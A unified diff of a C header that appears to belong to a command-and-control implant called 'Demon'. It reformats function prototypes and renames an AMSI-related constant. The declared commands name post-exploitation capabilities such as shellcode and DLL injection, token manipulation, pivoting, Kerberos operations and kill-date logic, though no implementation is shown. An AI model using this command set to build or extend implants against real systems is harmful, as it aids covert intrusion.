@@ -42,7 +42,7 @@
 #define DEMON_COMMAND_INLINE_EXECUTE_RAN_OK           3
 #define DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN     4
 
-#define DOTNET_INFO_AMSI_PATCHED        0x1
+#define DOTNET_INFO_PATCHED             0x1
 #define DOTNET_INFO_NET_VERSION         0x2
 #define DOTNET_INFO_ENTRYPOINT_EXECUTED 0x3
 #define DOTNET_INFO_FINISHED            0x4
@@ -141,35 +141,100 @@ typedef struct
     VOID ( *Function ) ( PPARSER Arguments );
 } DEMON_COMMAND ;
 
-VOID CommandDispatcher( VOID );
-
-VOID CommandCheckin( PPARSER Parser );
-VOID CommandSleep( PPARSER DataArgs );
 BOOL InWorkingHours( );
 BOOL ReachedKillDate( );
 VOID KillDate( );
-VOID CommandExit( PPARSER DataArgs );
-VOID CommandJob( PPARSER DataArgs );
-VOID CommandProc( PPARSER DataArgs );
-VOID CommandProcList( PPARSER DataArgs );
-VOID CommandFS( PPARSER DataArgs );
-VOID CommandInjectDLL( PPARSER DataArgs );
-VOID CommandInjectShellcode( PPARSER DataArgs );
-VOID CommandSpawnDLL( PPARSER DataArgs );
-VOID CommandInlineExecute(PPARSER DataArgs);
-VOID CommandDotnet( PPARSER Parser );
-VOID CommandAssemblyInlineExecute( PPARSER DataArgs );
-VOID CommandAssemblyListVersion( PPARSER Parser );
-VOID CommandScreenshot( PPARSER Parser );
 
-// Modules
-VOID CommandConfig( PPARSER Parser );
-VOID CommandNet( PPARSER Parser );
-VOID CommandToken( PPARSER Parser );
-VOID CommandPivot( PPARSER Parser );
-VOID CommandTransfer( PPARSER Parser );
-VOID CommandSocket( PPARSER Parser );
-VOID Commandkerberos( PPARSER Parser );
-VOID CommandMemFile( PPARSER Parser );
+/* dispatcher */
+VOID CommandDispatcher( VOID );
+
+/* commands */
+VOID CommandCheckin(
+    IN PPARSER Parser
+);
+
+VOID CommandSleep(
+    IN PPARSER DataArgs
+);
+
+VOID CommandExit(
+    IN PPARSER DataArgs
+);
+
+VOID CommandJob(
+    IN PPARSER DataArgs
+);
+
+VOID CommandProc(
+    IN PPARSER DataArgs
+);
+
+VOID CommandProcList(
+    IN PPARSER DataArgs
+);
+
+VOID CommandFS(
+    IN PPARSER DataArgs
+);
+
+VOID CommandInjectDLL(
+    IN PPARSER DataArgs
+);
+
+VOID CommandInjectShellcode(
+    IN PPARSER DataArgs
+);
+
+VOID CommandSpawnDLL(
+    IN PPARSER DataArgs
+);
+
+VOID CommandInlineExecute(
+    IN PPARSER DataArgs
+);
+
+VOID CommandAssemblyInlineExecute(
+    IN PPARSER DataArgs
+);
+
+VOID CommandAssemblyListVersion(
+    IN PPARSER Parser
+);
+
+VOID CommandScreenshot(
+    IN PPARSER Parser
+);
+
+VOID CommandConfig(
+    IN PPARSER Parser
+);
+
+VOID CommandNet(
+    IN PPARSER Parser
+);
+
+VOID CommandToken(
+    IN PPARSER Parser
+);
+
+VOID CommandPivot(
+    IN PPARSER Parser
+);
+
+VOID CommandTransfer(
+    IN PPARSER Parser
+);
+
+VOID CommandSocket(
+    IN PPARSER Parser
+);
+
+VOID CommandKerberos(
+    IN PPARSER Parser
+);
+
+VOID CommandMemFile(
+    IN PPARSER Parser
+);
 
 #endif
